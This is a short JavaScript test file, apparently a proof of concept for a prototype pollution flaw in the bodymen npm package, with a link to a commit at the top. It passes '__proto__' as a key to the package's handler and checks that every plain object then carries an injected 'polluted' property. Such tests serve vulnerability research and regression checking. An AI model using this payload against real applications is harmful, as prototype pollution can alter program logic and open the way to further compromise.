//https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b

test("prototype pollution in bodymen ", () => {

    const x = require("bodymen");
  //a.handler("__proto__","polluted","yes");
  expect({}.polluted).toBe(undefined);

  x.handler('__proto__', 'polluted', 'yes')
  expect({}.polluted).toBe("yes");

})